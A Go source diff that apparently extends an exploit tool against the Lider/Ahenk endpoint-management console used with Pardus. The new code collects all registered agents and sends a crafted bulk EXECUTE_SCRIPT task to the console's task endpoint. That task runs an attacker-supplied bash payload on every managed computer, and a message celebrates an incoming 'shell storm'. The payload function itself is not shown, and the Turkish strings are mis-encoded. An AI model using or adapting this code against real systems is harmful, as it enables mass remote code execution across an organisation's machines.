@@ -1,11 +1,15 @@
 package main
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"math/rand"
 	"net/http"
 	"net/url"
+	"strings"
+	"time"
 )
 
 type Agents []struct {
@@ -78,7 +82,7 @@ type Agents []struct {
 }
 
 
-func (cu *ConsoleUser)NewAgents(agentLdapBaseDn string){
+func (cu *ConsoleUser)NewAgents(agentLdapBaseDn string) *Agents{
 
 	print_info("Getting all the active computers")
 	client := http.Client{Jar: cu.cookieJar}
@@ -94,6 +98,7 @@ func (cu *ConsoleUser)NewAgents(agentLdapBaseDn string){
 	if err != nil {
 		panic_with_msg("Unable to login somehow. Dunno why", err)
 	}
+	defer resp.Body.Close()
 	
 	body, err := ioutil.ReadAll(resp.Body)
 
@@ -104,4 +109,72 @@ func (cu *ConsoleUser)NewAgents(agentLdapBaseDn string){
 	if err2 != nil {
 		panic_with_msg("asdsad", err)
 	}
+	return agents
+}
+
+func (cu *ConsoleUser)TriggerPayloadonAllAgents(agents *Agents){
+
+	a, err := json.Marshal(agents)
+
+	if err != nil {
+		panic_with_msg("Cant marshel the agents", err)
+	}
+	rand.Seed(time.Now().UnixNano())
+	godsJson := fmt.Sprintf(`
+	{
+		"id": 62,
+		"name": "Betik Ã‡alÄ±ÅŸtÄ±r",
+		"page": "execute-script",
+		"description": "Ä°stemcide betik Ã§alÄ±ÅŸtÄ±rÄ±r",
+		"commandId": "EXECUTE_SCRIPT",
+		"isMulti": true,
+		"plugin": {
+		  "id": 7,
+		  "name": "script",
+		  "version": "1.0.0",
+		  "description": "Betik Ã§alÄ±ÅŸtÄ±r",
+		  "active": true,
+		  "deleted": false,
+		  "machineOriented": true,
+		  "userOriented": true,
+		  "policyPlugin": true,
+		  "taskPlugin": true,
+		  "usesFileTransfer": false,
+		  "xBased": false,
+		  "createDate": "15/09/2021 18:49:09",
+		  "modifyDate": null
+		},
+		"state": 1,
+		"dnType": "AHENK",
+		"dnList": [
+		  "cn=pardus,ou=Agents,dc=liderahenk,dc=org"
+		],
+		"entryList": %s,
+		"cronExpression": null,
+		"parameterMap": {
+		  "SCRIPT_FILE_ID": "%d",
+		  "SCRIPT_TYPE": "bash",
+		  "SCRIPT_CONTENTS": "%s",
+		  "SCRIPT_PARAMS": ""
+		},
+		"activationDate": null
+	  }
+	`, a, (rand.Intn(10000 - 100) + 1000), strings.Replace(NewPayload(), "\"", "\\\"", -1))
+
+	client := http.Client{Jar: cu.cookieJar}
+
+    resp, err := client.Post(fmt.Sprintf("http://%s:8080/lider/task/execute", TARGET), "application/json", bytes.NewBuffer([]byte(godsJson)))
+
+	if err != nil {
+		panic_with_msg("Unable to triggger the bulk task endpoint", err)
+	}
+	defer resp.Body.Close()
+	
+	body, err := ioutil.ReadAll(resp.Body)
+
+	if strings.Contains(string(body), "Gonderildi"){
+		print_good("Hooold my beer ! Shell storm is coming.")
+	}
+
+
 }
